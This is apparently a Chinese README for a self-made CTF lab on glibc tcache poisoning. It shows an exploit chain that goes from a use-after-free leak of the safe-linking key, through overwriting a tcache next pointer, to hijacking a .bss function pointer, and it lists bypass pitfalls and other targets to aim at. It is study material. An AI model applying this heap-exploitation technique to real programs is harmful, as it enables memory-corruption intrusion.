# lab_tcache_poisoning —— 自造 tcache poisoning 靶场（L4）

> **这是自造实验，不是真实赛题。** 目的：在**现代 glibc（无 `__free_hook`）**上把
> tcache poisoning 完整跑一遍：UAF 读泄漏 safe-linking key → UAF 写改写 `next`
> → `malloc` 落到 `.bss` 的函数指针 → 劫持控制流。

---

## 1. 题目行为

```text
1. add      index / size / data   malloc(size) 存进 notes[index]，data 定长读入
2. edit     index / data          read(0, notes[index], sizes[index])   ← free 之后照样能写（UAF）
3. free     index                 free(notes[index])，**不清空指针**
4. show     index                 write(1, notes[index], sizes[index])  ← free 之后照样能读（UAF）
5. trigger                        if (fh.fn) fh.fn();
```

保护（`checksec`，本机 gcc + `-fno-pie -no-pie`）：

| 项 | 值 |
| --- | --- |
| 架构 | amd64，动态链接，glibc **2.43** |
| PIE | 无（基址 `0x400000`） |
| canary | 有（`-fstack-protector-strong`） |
| NX | 开启 |
| RELRO | Partial |

关键符号（随编译器版本会变，`exp.py` 一律用 `ELF().symbols` 取，不写死）：

```text
fh          0x4040a0    struct fake_hook { void (*fn)(void); char pad[0x38]; }，
                        __attribute__((aligned(16)))，顶替已被移除的 __free_hook
backdoor    0x401296    system("cat flag.txt")
```

## 2. 为什么是 tcache poisoning

| 排除项 | 原因 |
| --- | --- |
| `__free_hook` / `__malloc_hook` | glibc 2.34 起已删除，本机 2.43 上根本不存在这两个符号 |
| 直接 double free | glibc 2.29+ 的 `tcache_entry.key` 会检出 "double free detected in tcache 2" |
| unsorted bin / large bin attack | 本题只给 0x100 以内的小 chunk，且没有可用的 `bk` 写点 |

所以走 **UAF 改写 `next`**：不需要 double free，只要 free 之后还能写队尾 chunk 的
第一个 8 字节即可。

## 3. 利用链

```text
add(0, 0x40)  add(1, 0x40)        # 0x50 chunk：A、B
free(0)                            # tcache[0x50] = A，A->next = 0 ^ (A>>12)
leak = show(0, 0x40)               # 读 A 的用户数据 → 得到 (A>>12)，即 safe-linking key
free(1)                            # tcache[0x50] = B -> A
edit(0, p64(fh ^ key))             # UAF 写：A->next = fh ^ (A>>12)
add(2, ..) add(3, ..)              # 依次取回 B、A
add(4, p64(backdoor) + pad)        # 第 3 次 malloc 返回 &fh → 写入 backdoor
trigger()                          # fh.fn() == backdoor → system("cat flag.txt")
```

## 4. 坑点（本次实测踩到的）

1. **safe-linking 的 key 是“持有 next 的那个 chunk”地址右移 12 位**，不是目标地址的
   页号。泄漏只能从队尾（`next = NULL`）拿到，`enc = 0 ^ (A>>12) = A>>12`，正好
   直接就是 key，不需要再推 A 的绝对地址。
2. **`tcache_get()` 会检查 `aligned_OK(e)`**（glibc 2.32+），伪造目标必须 16 字节对齐；
   本 lab 用 `__attribute__((aligned(16)))` 保证。
3. **`tcache_get()` 还会回写 `e->key = 0`**（即 `&fh + 8`），所以 `fh` 后面必须留够
   可写空间，`struct fake_hook` 的 `pad[0x38]` 就是这个作用。
4. **不要用 double free**：2.29+ 会读 `key` 做检测；本 lab 用 UAF 读 + UAF 写绕过。
5. `-O0 -fno-pie -no-pie` 是必须的：既让 `fh` / `backdoor` 地址稳定，也避免编译器把
   `notes[]` 清空优化掉（那 UAF 就没了）。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn_Writeups/labs/lab_tcache_poisoning'
source ../../.venv/bin/activate
make                                   # gcc 一条命令重建
printf '__PWNED__{tcache_ok}\n' > flag.txt
python exp.py                          # 期望输出 __PWNED__{tcache_ok}
# 远程：socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./chal,pty,raw,echo=0 后
#       HOST=127.0.0.1 PORT=9999 python exp.py
```

## 6. 识别卡

```text
free 后仍可读/写同一 chunk（UAF）+ 只需要 8 字节可控 + glibc >= 2.32
  -> tcache poisoning：show 泄漏 (chunk>>12)，edit 改 next，malloc 落 .bss/目标
先确认目标：2.34+ 没有 __free_hook → 改程序自己的函数指针表 / exit_funcs / _IO_list_all
```

> 与真实题的关系：真实题（如 `card`、`tcache_tear`）常把 `__free_hook` 当目标；
> 本机 2.43 上这条路径已死，所以本 lab 用 `.bss` 函数指针演示同一套原语。
